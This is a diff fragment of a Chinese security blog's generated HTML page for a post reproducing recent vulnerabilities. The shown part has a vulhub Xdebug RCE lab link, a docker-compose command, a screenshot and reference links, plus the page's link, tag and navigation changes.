+<p> <a href="https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><img src="https://i.loli.net/2019/11/16/KJmEzgBOacZ1xMH.png" alt="Snipaste_2019-11-16_23-04-23.png"></p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="http://www.thinkphp.cn/topic/66216.html" target="_blank" rel="noopener">http://www.thinkphp.cn/topic/66216.html</a> </p>
+<p><a href="https://www.cnblogs.com/yuzly/p/11782608.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11782608.html</a> </p>
+<p><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template</a></p>
+<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a> </p>
 
       
 
@@ -278,7 +396,7 @@
           </li>
           <li class="post-copyright-link">
           <strong>文章链接:  </strong>
-          <a href="/2019/09/19/zzzphp1-7-0远程代码执行/" target="_blank" title="zzzphp1.7.0远程代码执行">https://glotozz.github.io/2019/09/19/zzzphp1-7-0远程代码执行/</a>
+          <a href="/2019/11/16/复现几个近期漏洞/" target="_blank" title="复现几个漏洞">https://glotozz.github.io/2019/11/16/复现几个近期漏洞/</a>
           </li>
           <li class="post-copyright-license">
             <strong>版权声明:   </strong>
@@ -302,7 +420,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">zzzphp</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cve</a>
         		</li>
       		
 		</ul>
@@ -358,7 +476,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/09/19/zzzphp1-7-0远程代码执行/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/11/16/复现几个近期漏洞/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -372,18 +490,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/22/省赛线下赛总结/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          省赛线下赛总结
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/09/18/一道入群题/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">一道入群题</div>
+    <a href="/2019/11/13/unctf竞技赛-web/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">unctf竞技赛-web</div>
       <i class="icon-circle-right"></i>
     </a>
   
